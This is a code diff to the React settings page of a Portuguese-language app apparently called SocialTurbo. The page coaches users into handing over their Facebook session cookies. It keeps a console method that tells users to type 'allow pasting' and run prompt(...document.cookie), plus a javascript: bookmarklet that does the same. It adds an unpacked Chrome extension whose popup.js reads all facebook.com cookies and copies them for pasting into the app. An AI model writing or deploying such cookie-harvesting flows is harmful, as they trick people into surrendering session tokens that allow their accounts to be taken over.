@@ -12,7 +12,10 @@ import {
   Trash2,
   Database,
   CheckCircle2,
-  Loader2
+  Loader2,
+  Monitor,
+  DownloadCloud,
+  Terminal
 } from 'lucide-react';
 import { auth, db, doc, getDoc, updateDoc, collection, getDocs, deleteDoc } from '../lib/firebase';
 import { UserProfile } from '../types';
@@ -126,66 +129,156 @@ export default function Settings() {
                 </div>
               </div>
               
-              <div className="space-y-6">
-                {/* Method A: The Infallible Prompt */}
-                <div className="bg-amber-500 border-2 border-white p-6 rounded-2xl shadow-xl relative overflow-hidden group">
-                  <div className="absolute top-0 right-0 p-2 bg-white/20 text-[10px] font-black uppercase italic">Dica do Especialista</div>
-                  <div className="flex gap-4 items-start">
-                    <div className="w-10 h-10 rounded-full bg-white text-amber-600 flex items-center justify-center font-black shrink-0 shadow-lg text-lg">A</div>
-                    <div className="flex-1">
-                      <h5 className="font-black text-lg mb-2 leading-tight uppercase italic">Método Infalível (Para quem tem pressa)</h5>
-                      <p className="text-xs mb-4 text-amber-50 leading-relaxed">
-                        1. Vá no seu <b>Facebook</b>.<br/>
-                        2. Aperte <b>F12</b>, clique em <b>Console</b>.<br/>
-                        3. Digite <code>allow pasting</code> e aperte Enter.<br/>
-                        4. Copie o código abaixo, cole lá e aperte <b>Enter</b>:
-                      </p>
-                      
-                      <div className="flex gap-2 bg-black/40 p-3 rounded-xl border border-white/20">
-                        <code className="text-[11px] font-mono text-amber-200 flex-1 break-all">
-                          prompt("🚀 SUCESSO! COPIE TUDO ABAIXO:", document.cookie)
-                        </code>
-                        <button 
-                          onClick={() => {
-                            navigator.clipboard.writeText('prompt("🚀 SUCESSO! COPIE TUDO ABAIXO:", document.cookie)');
-                            alert("Código de emergência copiado! Vá no Facebook, cole no console e aperte Enter.");
-                          }}
-                          className="bg-white text-amber-600 px-4 py-2 rounded-lg font-bold text-xs hover:bg-amber-50 transition-colors shrink-0 shadow-lg"
-                        >
-                          COPIAR CÓDIGO
-                        </button>
-                      </div>
-                      <p className="text-[10px] mt-3 text-amber-100 italic">
-                        * Isso abrirá uma janelinha BRANCA no Facebook com os dados. Basta dar Ctrl+C neles e colar aqui.
-                      </p>
-                    </div>
-                  </div>
+            <div className="bg-indigo-900 border-2 border-indigo-400 p-8 rounded-[2.5rem] text-white shadow-2xl mb-8 relative overflow-hidden group">
+              <div className="absolute top-0 right-0 p-4 bg-indigo-500/20 text-[10px] font-black uppercase tracking-[0.2em]">
+                RECOMENDADO
+              </div>
+              
+              <div className="flex flex-col md:flex-row items-center gap-8 relative z-10">
+                <div className="w-24 h-24 bg-gradient-to-br from-indigo-400 to-indigo-600 rounded-3xl flex items-center justify-center shrink-0 shadow-lg rotate-3 group-hover:rotate-0 transition-transform">
+                  <Monitor className="w-12 h-12 text-white" />
+                </div>
+                
+                <div className="flex-1 text-center md:text-left">
+                  <h4 className="text-2xl font-black mb-2 italic uppercase tracking-tighter">Extensão SocialTurbo Pro</h4>
+                  <p className="text-indigo-100 text-sm leading-relaxed max-w-lg font-medium">
+                    A forma mais segura e profissional de conectar. Sem códigos no console, sem avisos de erro do Facebook.
+                  </p>
                 </div>
 
-                {/* Method B: Bookmarklet */}
-                <div className="bg-white/10 p-5 rounded-2xl border border-white/10">
-                  <div className="flex gap-4 items-start">
-                    <div className="w-10 h-10 rounded-full bg-white/20 text-white flex items-center justify-center font-black shrink-0 text-lg">B</div>
-                    <div className="flex-1">
-                      <h5 className="font-bold mb-1">BOTÃO MÁGICO (Favoritos)</h5>
-                      <p className="text-xs text-blue-100 mb-4">Arraste para os favoritos e clique quando estiver no Facebook.</p>
-                      
-                      <div className="flex flex-col sm:flex-row items-center gap-4">
-                        <a 
-                          href="javascript:(function(){const c=document.cookie;if(!c){alert('❌ Erro: Logue no Facebook primeiro!');return;}prompt('SUCESSO! Copie tudo abaixo (Ctrl+C):', c);})();"
-                          className="inline-flex items-center gap-3 px-6 py-4 bg-white text-blue-600 font-black rounded-2xl shadow-xl hover:scale-105 transition-transform cursor-move border-b-4 border-slate-200"
-                          onClick={(e) => {
-                            e.preventDefault();
-                            alert('⚠️ ATENÇÃO: Você deve arrastar este botão para a sua barra de favoritos (perto da estrela do Chrome). Se não souber fazer, use o Método A acima que é mais simples!');
-                          }}
-                        >
-                          <Zap className="w-5 h-5 fill-current" />
-                          ARRASTE PARA FAVORITOS
-                        </a>
-                      </div>
+                <div className="flex flex-col gap-3 w-full md:w-auto">
+                  <a 
+                    href={LINK_DOWNLOAD_EXTENSAO}
+                    target="_blank"
+                    rel="noopener noreferrer"
+                    className="px-8 py-5 bg-white text-indigo-700 font-black rounded-2xl shadow-xl hover:scale-105 transition-all text-center flex items-center justify-center gap-3 no-underline"
+                  >
+                    <DownloadCloud className="w-6 h-6" />
+                    BAIXAR EXTENSÃO
+                  </a>
+                  <p className="text-[10px] text-center text-indigo-300 font-medium italic">Versão 1.0 - Oficial SocialTurbo</p>
+                </div>
+              </div>
+
+              <div className="mt-8 grid grid-cols-1 md:grid-cols-3 gap-4">
+                <div className="bg-white/5 p-4 rounded-2xl border border-white/10">
+                  <p className="text-[10px] font-black text-indigo-400 mb-2 uppercase">1. Baixe o ZIP</p>
+                  <p className="text-[11px] leading-tight text-indigo-100">Baixe no link acima e descompacte a pasta no seu computador.</p>
+                </div>
+                <div className="bg-white/5 p-4 rounded-2xl border border-white/10">
+                  <p className="text-[10px] font-black text-indigo-400 mb-2 uppercase">2. Modo Desenvolvedor</p>
+                  <p className="text-[11px] leading-tight text-indigo-100">Abra <b>chrome://extensions</b> e ative o "Modo Desenvolvedor" (canto superior direito).</p>
+                </div>
+                <div className="bg-white/5 p-4 rounded-2xl border border-white/10">
+                  <p className="text-[10px] font-black text-indigo-400 mb-2 uppercase">3. Carregar Extensão</p>
+                  <p className="text-[11px] leading-tight text-indigo-100">Clique em <b>Carregar sem Compactação</b> e selecione a pasta que você baixou.</p>
+                </div>
+              </div>
+            </div>
+
+            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+              {/* Method A: The Infallible Prompt */}
+              <div className="bg-slate-50 border border-slate-200 p-6 rounded-3xl relative overflow-hidden group">
+                <div className="flex gap-4 items-start">
+                  <div className="w-8 h-8 rounded-full bg-slate-200 text-slate-600 flex items-center justify-center font-black shrink-0 text-xs">M1</div>
+                  <div className="flex-1">
+                    <h5 className="font-bold text-slate-800 mb-1 italic">Método Manual (Console)</h5>
+                    <p className="text-[11px] text-slate-500 mb-3 leading-tight font-medium">Use caso não consiga instalar a extensão agora.</p>
+                    <div className="flex gap-2">
+                      <code className="text-[10px] font-mono bg-white border border-slate-200 p-2 rounded-lg flex-1 text-slate-600 truncate italic">
+                        prompt("Copie os Cookies:", document.cookie)
+                      </code>
+                      <button 
+                        onClick={() => {
+                          navigator.clipboard.writeText('prompt("🚀 SUCESSO! COPIE TUDO ABAIXO:", document.cookie)');
+                          alert("Código copiado! Cole no console do Facebook.");
+                        }}
+                        className="bg-white border border-slate-200 p-2 rounded-lg hover:bg-slate-100 text-slate-600"
+                      >
+                        <Save className="w-4 h-4" />
+                      </button>
                     </div>
                   </div>
                 </div>
+              </div>
+
+              {/* Method B: Bookmarklet */}
+              <div className="bg-slate-50 border border-slate-200 p-6 rounded-3xl group">
+                <div className="flex gap-4 items-start">
+                  <div className="w-8 h-8 rounded-full bg-slate-200 text-slate-600 flex items-center justify-center font-black shrink-0 text-xs">M2</div>
+                  <div className="flex-1">
+                    <h5 className="font-bold text-slate-800 mb-1 italic">Botão de Favoritos</h5>
+                    <p className="text-[11px] text-slate-500 mb-3 leading-tight font-medium">Arraste para sua barra de favoritos do navegador.</p>
+                    <a 
+                      href="javascript:(function(){const c=document.cookie;if(!c){alert('❌ Logue no Facebook!');return;}prompt('Copie aqui:', c);})();"
+                      className="inline-flex items-center gap-2 px-4 py-2 bg-white border border-slate-200 rounded-xl text-[10px] font-bold text-slate-600 hover:shadow-md cursor-move"
+                    >
+                      <Zap className="w-3 h-3 fill-slate-400" />
+                      CONECTAR TURBO
+                    </a>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div className="bg-slate-50 p-8 rounded-[2.5rem] border border-slate-200 space-y-6">
+              <div className="flex items-center gap-2 text-slate-800">
+                <Terminal className="w-6 h-6 text-indigo-600" />
+                <h4 className="text-lg font-black uppercase italic tracking-tighter">Arquivos da Extensão (Desenvolvedor)</h4>
+              </div>
+              <p className="text-xs text-slate-500 font-medium">Se você é o dono do sistema, copie os 3 códigos abaixo e salve em uma pasta para criar sua própria extensão oficial.</p>
+              
+              <div className="space-y-4">
+                <details className="group bg-white border border-slate-200 rounded-2xl overflow-hidden shadow-sm">
+                  <summary className="p-4 cursor-pointer font-bold text-sm text-slate-700 flex justify-between items-center bg-slate-50/50">
+                    1. manifest.json
+                    <span className="text-[10px] bg-slate-200 px-2 py-1 rounded">Clique para ver</span>
+                  </summary>
+                  <pre className="p-4 text-[10px] bg-slate-900 text-indigo-200 overflow-x-auto font-mono">
+{`{
+  "manifest_version": 3,
+  "name": "SocialTurbo Pro",
+  "version": "1.0",
+  "permissions": ["cookies", "activeTab", "storage"],
+  "host_permissions": ["*://*.facebook.com/*"],
+  "action": { "default_popup": "popup.html" }
+}`}
+                  </pre>
+                </details>
+
+                <details className="group bg-white border border-slate-200 rounded-2xl overflow-hidden shadow-sm">
+                  <summary className="p-4 cursor-pointer font-bold text-sm text-slate-700 flex justify-between items-center bg-slate-50/50">
+                    2. popup.html
+                    <span className="text-[10px] bg-slate-200 px-2 py-1 rounded">Clique para ver</span>
+                  </summary>
+                  <pre className="p-4 text-[10px] bg-slate-900 text-indigo-200 overflow-x-auto font-mono">
+{`<!DOCTYPE html>
+<html>
+<body style="width:200px;padding:10px;text-align:center;font-family:sans-serif;">
+  <h2 style="font-size:14px;color:#1e3a8a;">SocialTurbo</h2>
+  <button id="btn" style="background:#2563eb;color:white;border:none;padding:10px;border-radius:5px;cursor:pointer;width:100%;">COPIAR ACESSO</button>
+  <p id="msg" style="font-size:10px;margin-top:10px;"></p>
+  <script src="popup.js"></script>
+</body>
+</html>`}
+                  </pre>
+                </details>
+
+                <details className="group bg-white border border-slate-200 rounded-2xl overflow-hidden shadow-sm">
+                  <summary className="p-4 cursor-pointer font-bold text-sm text-slate-700 flex justify-between items-center bg-slate-50/50">
+                    3. popup.js
+                    <span className="text-[10px] bg-slate-200 px-2 py-1 rounded">Clique para ver</span>
+                  </summary>
+                  <pre className="p-4 text-[10px] bg-slate-900 text-indigo-200 overflow-x-auto font-mono">
+{`document.getElementById('btn').addEventListener('click', async () => {
+  const cookies = await chrome.cookies.getAll({ domain: "facebook.com" });
+  const str = cookies.map(c => \`\${c.name}=\${c.value}\`).join('; ');
+  navigator.clipboard.writeText(str);
+  document.getElementById('msg').innerText = "✅ COPIADO!";
+  alert("Dados copiados! Agora cole no SocialTurbo.");
+});`}
+                  </pre>
+                </details>
               </div>
             </div>
 
